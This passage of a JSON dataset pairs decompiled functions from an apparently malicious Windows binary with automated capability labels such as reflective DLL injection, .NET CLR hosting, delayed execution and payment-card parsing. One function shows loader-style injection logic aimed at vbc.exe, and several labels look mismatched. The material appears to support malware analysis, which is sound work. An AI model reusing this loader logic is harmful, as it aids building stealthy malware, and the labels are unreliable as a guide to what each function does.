        "token_count": 773
    },
    "00429820": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\nint32_t fcn.00429820(char *param_1, int32_t param_2, char *param_3, char **param_4)\n\n{\n    char *pcVar1;\n    char cVar2;\n    char **ppcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    char cVar6;\n    char *s1;\n    char *pcVar7;\n    char *pcVar8;\n    \n    pcVar1 = param_1 + param_2 + -1;\n    s1 = param_1;\ncode_r0x00429849:\n    do {\n        cVar6 = *param_3;\n        ppcVar3 = param_4;\n        while( true ) {\n            if (cVar6 == '\\0') {\n                *s1 = '\\0';\n                return s1 - param_1;\n            }\n            if (pcVar1 <= s1) goto code_r0x00429900;\n            if (cVar6 != '%') goto code_r0x00429841;\n            cVar2 = param_3[1];\n            if (cVar2 != 's') break;\n            pcVar4 = *ppcVar3;\n            cVar6 = *pcVar4;\n            if (cVar6 != '\\0') {\n                pcVar8 = pcVar4 + (pcVar1 - s1);\n                pcVar7 = s1;\n                while( true ) {\n                    pcVar4 = pcVar4 + 1;\n                    s1 = pcVar7 + 1;\n                    *pcVar7 = cVar6;\n                    cVar6 = *pcVar4;\n                    if (cVar6 == '\\0') break;\n                    pcVar7 = s1;\n                    if (pcVar8 == pcVar4) goto code_r0x00429900;\n                }\n            }\n            param_3 = param_3 + 2;\n            cVar6 = *param_3;\n            ppcVar3 = ppcVar3 + 1;\n        }\n        if (cVar2 == 'z') {\n            if (param_3[2] == 'u') {\n                param_4 = ppcVar3 + 1;\n                iVar5 = fcn.00429790(s1, pcVar1 - s1, *ppcVar3);\n                if (iVar5 < 1) {\ncode_r0x00429900:\n                    fcn.0042a530(param_1, s1);\n                    return *(extraout_ECX + 0x20);\n                }\n                s1 = s1 + iVar5;\n                param_3 = param_3 + 3;\n                goto code_r0x00429849;\n            }\n        }\n        else {\n            param_3 = param_3 + (cVar2 == '%');\n        }\ncode_r0x00429841:\n        *s1 = cVar6;\n        param_3 = param_3 + 1;\n        s1 = s1 + 1;\n        param_4 = ppcVar3;\n    } while( true );\n}\n",
        "token_count": 671
    },
    "00427250": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nfloat10 fcn.00427250(int32_t param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    uint32_t uStack32;\n    \n    uVar1 = param_1 + 0x14;\n    iVar2 = uVar1 + *(param_1 + 0x10) * 4;\n    uStack32 = *(iVar2 + -4);\n    uVar3 = 0x1f;\n    if (uStack32 != 0) {\n        for (; uStack32 >> uVar3 == 0; uVar3 = uVar3 - 1) {\n        }\n    }\n    uVar3 = uVar3 ^ 0x1f;\n    *param_2 = 0x20 - uVar3;\n    if (uVar3 < 0xb) {\n        uVar5 = 0xb - uVar3;\n        uVar6 = 0;\n        if (uVar1 < iVar2 - 4U) {\n            uVar6 = *(iVar2 + -8) >> (uVar5 & 0x1f);\n        }\n        return CONCAT44(uStack32 >> (uVar5 & 0x1f), uStack32 << (uVar3 + 0x15U & 0x1f) | uVar6) | 0x3ff0000000000000;\n    }\n    iVar4 = uVar3 - 0xb;\n    uVar5 = iVar4;\n    if (uVar1 < iVar2 - 4U) {\n        uVar3 = *(iVar2 + -8);\n        if (iVar4 != 0) {\n            uStack32 = uStack32 << (uVar5 & 0x1f) | 0x3ff00000 | uVar3 >> (0x20 - uVar5 & 0x1f);\n            uVar3 = uVar3 << (uVar5 & 0x1f);\n            if (uVar1 < iVar2 - 8U) {\n                uVar3 = uVar3 | *(iVar2 + -0xc) >> (0x20 - uVar5 & 0x1f);\n            }\n            goto code_r0x00427324;\n        }\n    }\n    else {\n        uVar3 = 0;\n        if (iVar4 != 0) {\n            uVar3 = 0;\n            uStack32 = uStack32 << (uVar5 & 0x1f) | 0x3ff00000;\n            goto code_r0x00427324;\n        }\n    }\n    uStack32 = uStack32 | 0x3ff00000;\ncode_r0x00427324:\n    return CONCAT44(uStack32, uVar3);\n}\n",
        "token_count": 642
    },
    "00401afc": {
        "rules": [
            "delay execution",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.00401afc(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint extraout_ECX;\n    uint extraout_EDX;\n    uint *puVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uchar auStack291404 [24];\n    uint uStack291380;\n    uint auStack291356 [72834];\n    uint uStack20;\n    \n    uStack20 = 0x401b0c;\n    iVar1 = fcn.00418950();\n    puVar3 = &stack0xffffffec + -iVar1;\n    *(&stack0xffffffec + -iVar1) = 0x401b25;\n    (*_sym.imp.KERNEL32.dll_FreeConsole)();\n    *puVar3 = 0;\n    puVar4 = puVar3 + -1;\n    puVar3[-1] = 0x401b32;\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    puVar4[-1] = extraout_EDX;\n    puVar6 = 0x4ae040;\n    puVar7 = &stack0xfffb8de4;\n    for (iVar1 = 0x11c80; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar7 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    puVar4[-1] = \"C:\\\\Windows\\\\Microsoft.NET\\\\Fra\";\n    puVar4[-2] = 0x401b48;\n    fcn.004015ea(puVar4[-1]);\n    puVar4[-2] = extraout_ECX;\n    puVar4[-2] = \"mework\\\\v4.0.30319\\\\vbc.exe\";\n    puVar4[-3] = 0x401b57;\n    uVar2 = fcn.004932f0();\n    puVar4[-3] = uVar2;\n    puVar4[-1] = 0x299;\n    puVar4[-2] = 0x77e;\n    puVar4[-3] = 0x4f5240;\n    puVar4[0x19] = 0x4f8d53;\n    puVar4[0x17] = 0x9da0d;\n    puVar4[0x18] = 0;\n    puVar4[0x16] = 0x5a;\n    puVar4[0x15] = 0x9fd3e;\n    puVar4[0x14] = 0x4afc;\n    puVar4[0x12] = 0x8f7a6;\n    puVar4[0x13] = 0;\n    puVar4[0x11] = 0x4e72fa;\n    puVar4[0x10] = 0x74d85d;\n    puVar4[0xe] = 0xfe61;\n    puVar4[0xf] = 0;\n    puVar4[0xd] = 0x12342;\n    puVar4[0xc] = 0xb8bac;\n    *(puVar4 + 10) = 0;\n    puVar4[9] = 0x7742;\n    puVar4[8] = 0xcd;\n    puVar4[6] = 0x283;\n    puVar4[7] = 0;\n    puVar4[4] = 0x21e4;\n    puVar4[5] = 0;\n    puVar4[2] = 0x30d;\n    puVar4[3] = 0;\n    *puVar4 = 0xa3d70a3d;\n    puVar4[1] = 0x40800370;\n    puVar4[-4] = 0x401c3a;\n    fcn.004016bc(puVar4[-3], puVar4[-2], puVar4[-1], *puVar4, puVar4[1], puVar4[2], puVar4[3], puVar4[4], puVar4[5], \n                 puVar4[6], puVar4[7], puVar4[8], puVar4[9], puVar4[10], puVar4[0xb], puVar4[0xc], puVar4[0xd], \n                 puVar4[0xe], puVar4[0xf], puVar4[0x10], puVar4[0x11], puVar4[0x12], puVar4[0x13], puVar4[0x14], \n                 puVar4[0x15], puVar4[0x16], puVar4[0x17], puVar4[0x18], puVar4[0x19]);\n    *puVar4 = 0x5b;\n    puVar4[-1] = 0x77e;\n    puVar4[-2] = 0x4f5240;\n    puVar4[-3] = \"ryy6u9x6qFf1C9uGzZEZkL3R2oUz70wsSsoAV0SdpRDX5LnDCSYJVmbBNaTDU8zJRd9JzfitobkgSj4pKJ0xNX8w67\";\n    puVar4[-4] = 0x401c5e;\n    fcn.0040166b(puVar4[-3], puVar4[-2], puVar4[-1], *puVar4);\n    puVar4[-1] = 1;\n    puVar4[-2] = &stack0xfffb8db4;\n    puVar4[-3] = &stack0xfffb8dcc;\n    puVar4[-4] = 0x401c78;\n    fcn.00401830(puVar4[-3], puVar4[-2], puVar4[-1]);\n    *puVar4 = 0x5b;\n    puVar4[-1] = 0x47200;\n    puVar4[-2] = &stack0xfffb8de4;\n    puVar4[-3] = \"R2v9qXwKNhgOu2jYnbWZHRLs9JJL1m28QX7SBLxXtJeCn50LeRQKsCiKaBAjdr8lh4u5AKXJEg97bHgjgKyLkBLQHK\";\n    puVar4[-4] = 0x401caa;\n    fcn.0040166b(puVar4[-3], puVar4[-2], puVar4[-1], *puVar4);\n    puVar4[1] = 0x876512;\n    *puVar4 = 0x656736;\n    puVar4[-3] = uStack291380;\n    puVar4[-1] = &stack0xfffb8de4;\n    puVar4[-2] = 0;\n    puVar5 = puVar4 + -4;\n    puVar4[-4] = 0x401cd6;\n    (*0x4f53c1)();\n    *(puVar5 + -4) = 0x401cdd;\n    fcn.00493440();\n    *(puVar5 + -4) = 0x401ce4;\n    fcn.004906c0();\n    return 0;\n}\n",
        "token_count": 1687
    },
    "00401f92": {
        "rules": [
            "delay execution",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "create thread"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nfloat10 fcn.00401f92(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_20h;\n    uint var_bp_4h;\n    \n    iVar2 = 0x5fbf;\n    do {\n        (*_sym.imp.KERNEL32.dll_Sleep)(0);\n        (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004015c0, 0, 0, 0);\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    uVar1 = fcn.004015ea(\"bqpumqdoteccrkuahwfuyaeqqardcwhsbarcamiypdtvcm\");\n    fcn.004906c0(uVar1);\n    return *0x4f88fc;\n}\n",
        "token_count": 201
    },
    "00418d60": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.00418d60(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    LOCK();\n    *param_1 = *param_1 + 1;\n    if (*param_1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(param_1[1], 0xffffffff);\n        if (iVar1 != 0) {\n            LOCK();\n            *param_1 = *param_1 + -1;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 124
    },
    "00418e60": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.00418e60(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    LOCK();\n    *param_1 = *param_1 + 1;\n    if (*param_1 == 0) {\n        param_1[1] = 1;\n        param_1[2] = iVar1;\n        uVar2 = 0;\n    }\n    else {\n        if (param_1[2] == iVar1) {\n            LOCK();\n            *param_1 = *param_1 + -1;\n            param_1[1] = param_1[1] + 1;\n            return 0;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(param_1[3], 0xffffffff);\n        if (iVar3 == 0) {\n            param_1[1] = 1;\n            param_1[2] = iVar1;\n            return 0;\n        }\n        LOCK();\n        *param_1 = *param_1 + -1;\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 275
    },
    "004014c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004014c0(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll__onexit(param_1);\n    return -(iVar1 == 0);\n}\n",
        "token_count": 51
    },
    "004016bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint64_t __cdecl\nfcn.004016bc(uint arg_8h, uint arg_ch, int32_t arg_10h, uint noname_3, uint noname_4, uint32_t arg_1ch, int32_t arg_20h\n            , uint32_t arg_24h, int32_t arg_28h, uint32_t arg_2ch, int32_t arg_30h, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint arg_54h\n            , uint noname_20, uint arg_5ch, uint arg_60h, uint noname_23, uint noname_24, uint noname_25, uint noname_26\n            , uint noname_27, uint32_t arg_78h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint *puVar10;\n    uint64_t uVar11;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_44h;\n    uint var_3fh;\n    uint lpModuleName;\n    uint var_bp_ch;\n    \n    uVar5 = arg_10h * 0x101c;\n    uVar2 = uVar5 * arg_1ch;\n    uVar3 = arg_24h * 0x19c;\n    uVar6 = uVar2 + arg_2ch;\n    fcn.0046ba10(uVar6 - uVar3, \n                 (((uVar5 * arg_1ch >> 0x20) + (uVar5 >> 0x1f) * arg_1ch + arg_20h * uVar5 + arg_30h +\n                  CARRY4(uVar2, arg_2ch)) - ((arg_24h * 0x19c >> 0x20) + arg_28h * 0x19c)) - (uVar6 < uVar3));\n    iVar8 = 0;\n    puVar9 = 0x4ae020;\n    puVar10 = &var_3fh;\n    for (iVar7 = 0xf; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    do {\n        uVar1 = ((*(&var_3fh + iVar8) ^ 0x10) >> 2 | *(&var_3fh + iVar8) << 6) - 0x2a;\n        uVar1 = iVar8 - ((-(uVar1 >> 3 | uVar1 * ' ') ^ 99) - 0x29 ^ 0xeb);\n        uVar1 = ~(((uVar1 * '\\x04' | uVar1 >> 6) ^ 0x62) - 0xe);\n        *(&var_3fh + iVar8) = uVar1 >> 1 | uVar1 << 7;\n        iVar8 = iVar8 + 1;\n    } while (iVar8 != 0xf);\n    fcn.004015ea(\"kerne\");\n    fcn.004932f0(\"l32.dll\");\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName);\n    var_44h = 0;\n    *0x549034 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4, &var_3fh);\n    (**0x549034)(arg_8h, arg_ch, 0x40, &var_44h);\n    uVar11 = fcn.00418980(arg_54h, 0, arg_5ch, arg_60h);\n    fcn.004906c0();\n    return uVar11 & 0xffffffff00000000 | uVar11 ^ arg_78h;\n}\n",
        "token_count": 960
    },
    "0040df00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0040df00(int32_t param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *puVar2;\n    \n    // switch table (80 cases) at 0x5033a0\n    switch(param_2) {\n    default:\n        goto code_r0x0040df4e;\n    case 1:\n    case 2:\n    case 3:\n    case 4:\n    case 0xb:\n    case 0x21:\n    case 0x2b:\n    case 0x2d:\n    case 0x36:\n    case 0x37:\n    case 0x38:\n    case 0x39:\n    case 0x3a:\n    case 0x3c:\n    case 0x3d:\n    case 0x3f:\n    case 0x4b:\n    case 0x4d:\n        if (param_1 == 0) {\n            return NULL;\n        }\n    case 0x2a:\n    case 0x30:\n        if (param_3 == 0) {\n            return NULL;\n        }\n        break;\n    case 9:\n    case 10:\n    case 0xc:\n    case 0xd:\n    case 0xe:\n    case 0xf:\n    case 0x10:\n    case 0x11:\n    case 0x12:\n    case 0x13:\n    case 0x14:\n    case 0x15:\n    case 0x16:\n    case 0x17:\n    case 0x22:\n    case 0x23:\n    case 0x24:\n    case 0x25:\n    case 0x26:\n    case 0x28:\n    case 0x33:\n    case 0x34:\n    case 0x35:\n    case 0x3b:\n    case 0x3e:\n    case 0x42:\n    case 0x43:\n    case 0x44:\n    case 0x48:\n    case 0x49:\n    case 0x4a:\n        if (param_1 == 0) {\n            return NULL;\n        }\n        break;\n    case 0x19:\n    case 0x1a:\n    case 0x1b:\n    case 0x1c:\n    case 0x1d:\n    case 0x1e:\n    case 0x1f:\n    case 0x20:\n    case 0x29:\n    case 0x2e:\n    case 0x2f:\n    case 0x4c:\n    case 0x4e:\n    case 0x4f:\n        break;\n    }\n    iVar1 = *(in_EAX + 0x14);\n    if (iVar1 < *(in_EAX + 0x18)) {\n        puVar2 = iVar1 * 0x10 + *(in_EAX + 0x10);\n        puVar2[1] = 0;\n        *(in_EAX + 0x14) = iVar1 + 1;\n        *puVar2 = param_2;\n        puVar2[3] = param_3;\n        puVar2[2] = param_1;\n        return puVar2;\n    }\ncode_r0x0040df4e:\n    return NULL;\n}\n",
        "token_count": 757
    },
    "0040e030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e030(int32_t param_1, uchar *param_2)\n\n{\n    uchar *puVar1;\n    uchar uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (param_1 != 0) {\n        puVar1 = param_2 + param_1;\n        iVar4 = *(in_EAX + 0x100);\n        do {\n            uVar2 = *param_2;\n            if (iVar4 == 0xff) {\n                *(in_EAX + 0xff) = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar3 = 1;\n                iVar4 = 0;\n            }\n            else {\n                iVar3 = iVar4 + 1;\n            }\n            param_2 = param_2 + 1;\n            *(in_EAX + 0x100) = iVar3;\n            *(in_EAX + iVar4) = uVar2;\n            *(in_EAX + 0x104) = uVar2;\n            iVar4 = iVar3;\n        } while (param_2 != puVar1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 292
    },
    "0040e190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.0040e190(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint *puVar3;\n    \n    iVar1 = *(in_EAX + 0x14);\n    if (iVar1 < *(in_EAX + 0x18)) {\n        puVar3 = iVar1 * 0x10 + *(in_EAX + 0x10);\n        puVar3[1] = 0;\n        *(in_EAX + 0x14) = iVar1 + 1;\n        *puVar3 = 0x41;\n        uVar2 = fcn.0040e0d0();\n        puVar3[2] = uVar2;\n        return puVar3;\n    }\n    return NULL;\n}\n",
        "token_count": 176
    },
    "0040e210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.0040e210(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    if (**(in_EAX + 0xc) != 'T') {\n        return NULL;\n    }\n    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n    iVar2 = fcn.0040e1d0();\n    if ((-1 < iVar2) && (iVar1 = *(in_EAX + 0x14),  iVar1 < *(in_EAX + 0x18))) {\n        puVar3 = *(in_EAX + 0x10) + iVar1 * 0x10;\n        puVar3[1] = 0;\n        *(in_EAX + 0x14) = iVar1 + 1;\n        *puVar3 = 5;\n        puVar3[2] = iVar2;\n        return puVar3;\n    }\n    return NULL;\n}\n",
        "token_count": 229
    },
    "0040f0f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040f0f0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t aiStack32 [4];\n    \n    aiStack32[0] = 0;\n    piVar3 = aiStack32;\n    if (**(in_EAX + 0xc) == param_2) {\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n        uVar2 = fcn.0040df00(0);\n        return uVar2;\n    }\n    while( true ) {\n        uVar2 = *(in_EAX + 0x30);\n        *(in_EAX + 0x30) = 1;\n        iVar1 = fcn.0040ea70();\n        *(in_EAX + 0x30) = uVar2;\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar1 = fcn.0040df00(0);\n        *piVar3 = iVar1;\n        if (iVar1 == 0) break;\n        piVar3 = iVar1 + 0xc;\n        if (**(in_EAX + 0xc) == param_2) {\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n            return aiStack32[0];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 337
    },
    "00410570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00410570(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (**(in_EAX + 0xc) == 'J') {\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n    }\n    else if (param_2 == 0) {\n        iVar1 = fcn.00410270();\n        if (iVar1 == 0) {\n            return 0;\n        }\n        goto code_r0x0041059b;\n    }\n    iVar1 = fcn.0040f7c0();\n    if ((iVar1 == 0) || (iVar1 = fcn.00410270(),  iVar1 == 0)) {\n        return 0;\n    }\ncode_r0x0041059b:\n    uVar2 = fcn.0040df00(iVar1);\n    return uVar2;\n}\n",
        "token_count": 223
    },
    "004105e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004105e0(void)\n\n{\n    char *pcVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    pcVar1 = *(in_EAX + 0xc);\n    if (*pcVar1 != 'F') {\n        return 0;\n    }\n    *(in_EAX + 0xc) = pcVar1 + 1;\n    if (pcVar1[1] == 'Y') {\n        *(in_EAX + 0xc) = pcVar1 + 2;\n    }\n    fcn.00410570();\n    uVar2 = fcn.0040df60();\n    if (**(in_EAX + 0xc) == 'E') {\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 194
    },
    "00416410": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00416410(int32_t *param_1, int32_t *param_2)\n\n{\n    uchar *in_EAX;\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uStack32;\n    \n    if (param_2 != NULL) {\n        iVar1 = param_2[2];\n        while (iVar1 == 0) {\n            if (*param_2[1] - 0x19U < 0x13) {\n                uVar4 = 1 << (*param_2[1] - 0x19U & 0x1f);\n                if ((uVar4 & 0x43107) != 0) {\n                    uVar2 = in_EAX[0x104];\n                    iVar1 = *(in_EAX + 0x100);\ncode_r0x00416661:\n                    iVar3 = iVar1;\n                    if (uVar2 == 0x20) {\ncode_r0x004165cf:\n                        if (iVar3 != 0xff) goto code_r0x004165da;\ncode_r0x00416692:\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))(in_EAX, 0xff, *(in_EAX + 0x10c));\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar1 = 1;\n                        iVar3 = 0;\n                    }\n                    else {\n                        if (iVar1 == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))(in_EAX, 0xff, *(in_EAX + 0x10c));\n                            *in_EAX = 0x20;\n                            iVar3 = 1;\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        }\n                        else {\n                            iVar3 = iVar1 + 1;\n                            *(in_EAX + 0x100) = iVar3;\n                            in_EAX[iVar1] = 0x20;\n                            in_EAX[0x104] = 0x20;\n                            if (iVar3 == 0xff) goto code_r0x00416692;\n                        }\ncode_r0x004165da:\n                        iVar1 = iVar3 + 1;\n                    }\n                    *(in_EAX + 0x100) = iVar1;\n                    in_EAX[iVar3] = 0x28;\n                    uStack32 = *(in_EAX + 0x114);\n                    in_EAX[0x104] = 0x28;\n                    *(in_EAX + 0x114) = 0;\n                    fcn.00416740(0);\n                    iVar1 = *(in_EAX + 0x100);\n                    if (iVar1 != 0xff) {\n                        iVar3 = iVar1 + 1;\n                        *(in_EAX + 0x100) = iVar3;\n                        in_EAX[iVar1] = 0x29;\n                        in_EAX[0x104] = 0x29;\n                        if (iVar3 != 0xff) goto code_r0x004164ad;\n                        goto code_r0x00416520;\n                    }\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))(in_EAX, 0xff, *(in_EAX + 0x10c));\n                    *in_EAX = 0x29;\n                    iVar3 = 1;\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    goto code_r0x004164ad;\n                }\n                if ((uVar4 & 0xe00) != 0) {\n                    uVar2 = in_EAX[0x104];\n                    iVar1 = *(in_EAX + 0x100);\n                    iVar3 = iVar1;\n                    if ((uVar2 & 0xfd) != 0x28) goto code_r0x00416661;\n                    goto code_r0x004165cf;\n                }\n            }\n            param_2 = *param_2;\n            if (param_2 == NULL) break;\n            iVar1 = param_2[2];\n        }\n    }\n    uStack32 = *(in_EAX + 0x114);\n    *(in_EAX + 0x114) = 0;\n    fcn.00416740(0);\n    iVar3 = *(in_EAX + 0x100);\n    if (iVar3 == 0xff) {\ncode_r0x00416520:\n        in_EAX[0xff] = 0;\n        (**(in_EAX + 0x108))(in_EAX, 0xff, *(in_EAX + 0x10c));\n        *in_EAX = 0x28;\n        in_EAX[0x104] = 0x28;\n        iVar1 = *param_1;\n        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n        *(in_EAX + 0x100) = 1;\n        if (iVar1 != 0) goto code_r0x004164c8;\n        iVar1 = 1;\n    }\n    else {\ncode_r0x004164ad:\n        iVar1 = iVar3 + 1;\n        *(in_EAX + 0x100) = iVar1;\n        in_EAX[iVar3] = 0x28;\n        in_EAX[0x104] = 0x28;\n        if (*param_1 != 0) {\ncode_r0x004164c8:\n            fcn.00411160();\n            iVar1 = *(in_EAX + 0x100);\n        }\n        if (iVar1 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))(in_EAX, 0xff, *(in_EAX + 0x10c));\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar3 = 1;\n            iVar1 = 0;\n            goto code_r0x004164e5;\n        }\n    }\n    iVar3 = iVar1 + 1;\ncode_r0x004164e5:\n    *(in_EAX + 0x100) = iVar3;\n    in_EAX[iVar1] = 0x29;\n    in_EAX[0x104] = 0x29;\n    fcn.00416740(1);\n    *(in_EAX + 0x114) = uStack32;\n    return;\n}\n",
        "token_count": 1491
    },
    "00416b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00416b00(int32_t *param_1, int32_t *param_2)\n\n{\n    uchar *in_EAX;\n    int32_t iVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    \n    if (param_2 != NULL) {\ncode_r0x00416b15:\n        if (param_2[2] != 0) goto code_r0x00416b20;\n        if (*param_2[1] != 0x2a) {\n            puVar4 = 0x5040a8;\n            uVar2 = 0x20;\n            iVar3 = *(in_EAX + 0x100);\n            while( true ) {\n                if (iVar3 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar1 = 1;\n                    iVar3 = 0;\n                }\n                else {\n                    iVar1 = iVar3 + 1;\n                }\n                *(in_EAX + 0x100) = iVar1;\n                puVar4 = puVar4 + 1;\n                in_EAX[iVar3] = uVar2;\n                in_EAX[0x104] = uVar2;\n                if (puVar4 == 0x5040aa) break;\n                uVar2 = *puVar4;\n                iVar3 = iVar1;\n            }\n            fcn.00416740(0);\n            iVar3 = *(in_EAX + 0x100);\n            if (iVar3 != 0xff) {\n                iVar1 = iVar3 + 1;\n                *(in_EAX + 0x100) = iVar1;\n                in_EAX[iVar3] = 0x29;\n                in_EAX[0x104] = 0x29;\n                goto code_r0x00416b40;\n            }\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *in_EAX = 0x29;\n            iVar1 = 1;\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            goto code_r0x00416b4b;\n        }\n        fcn.00416740(0);\n        iVar3 = *(in_EAX + 0x100);\n        goto code_r0x00416b5f;\n    }\ncode_r0x00416b3a:\n    iVar1 = *(in_EAX + 0x100);\ncode_r0x00416b40:\n    if (iVar1 == 0xff) {\n        in_EAX[0xff] = 0;\n        (**(in_EAX + 0x108))();\n        *in_EAX = 0x20;\n        iVar3 = 1;\n        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\ncode_r0x00416b67:\n        iVar1 = iVar3 + 1;\n        *(in_EAX + 0x100) = iVar1;\n        in_EAX[iVar3] = 0x5b;\n        in_EAX[0x104] = 